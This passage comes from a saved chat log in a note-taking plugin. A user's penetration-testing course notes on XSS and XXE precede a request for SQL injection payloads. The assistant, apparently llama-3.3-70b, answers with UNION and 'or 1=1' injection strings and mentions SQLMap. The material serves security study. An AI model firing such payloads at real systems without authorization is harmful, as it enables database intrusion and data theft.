cookies.==**\n\t![[Pasted image 20250406060022.png]]\n\n- **Stored**\n---\n\t- When the **payload is included in the DB** and then retrieved later\n\t- **==If some user can view this, then this would be executed.==**\n\t- ![[Pasted image 20250406060242.png]]\n\n- **DOM-Based**\n---\n- Client side has some vulnerable javascript inputs\n- ![[Pasted image 20250406060434.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/XXE/External Entities Injection.md\n- ==**For applications accepting and parsing `XML**`==\n- ==**XML data to API endpoints that expect `json==`**\n- Most of the times, **copy from [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)**\n\n- **Allows an attacker to interfere with an application's processing of XML data**. It often allows an attacker **to view files.**\n- XXE vulnerabilities arise because the XML specification contains various **potentially dangerous features, and standard parsers**\n\n# Exploitation\n---\n- For a structure:\n\t- ![[Pasted image 20250407163652.png]]\n- Safe `xxe` would be:\n\t- ![[Pasted image 20250407163718.png]]\n- Unsafe would be:\n\t- ![[Pasted image 20250407163742.png]]\n\t![[Pasted image 20250407163903.png]]\n```\n\n\n@Web App Enumeratioon Give me some payloads to check for SQLI\n\n"
+        }
+      ],
+      "id": "8f6a3ae9-a4bf-447d-9491-dc45d388311c",
+      "mentionables": [
+        {
+          "type": "current-file",
+          "file": "PNPT/WPE/regsvc ACL/Exploitation.md"
+        },
+        {
+          "type": "folder",
+          "folder": "PNPT/PEH/Web App Enumeratioon"
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": "### SQL Injection Payloads\nTo check for SQL Injection, you can use the following payloads:\n\n<smtcmp_block filename=\"PNPT/PEH/Web App Enumeratioon/SQL Injection/UNION injection.md\" language=\"markdown\">\n## SQL Injection Payloads\n- `jeremy' or 1=1#`\n- `jeremy' OR 1=1-- -`\n- `jeremy' UNION select NULL,NULL,NULL#`\n- `jeremy' UNION select NULL, table_name, NULL FROM information_schema.columns#`\n</smtcmp_block>\n\nThese payloads are used to detect SQL Injection vulnerabilities. The first two payloads are used to check for basic SQL Injection, while the last two payloads are used to extract information from the database using UNION-based SQL Injection.\n\nRemember to URL encode your payloads (Ctrl + U in Burp Suite) and to test them in different contexts, such as in search fields, login forms, or any other user-input fields. \n\nAlso, you can use tools like SQLMap to automate the process of detecting and exploiting SQL Injection vulnerabilities.",
+      "id": "ad557a51-b3c9-4c34-b3de-43e18bce4512",
+      "metadata": {
+        "model": {
+          "providerId": "groq",
+          "providerType": "groq",
+          "id": "69",
+          "model": "llama-3.3-70b-versatile"
+        }
+      }
+    }
+  ],
+  "createdAt": 1744919938750,
+  "updatedAt": 1744920037138,
+  "schemaVersion": 1
+}
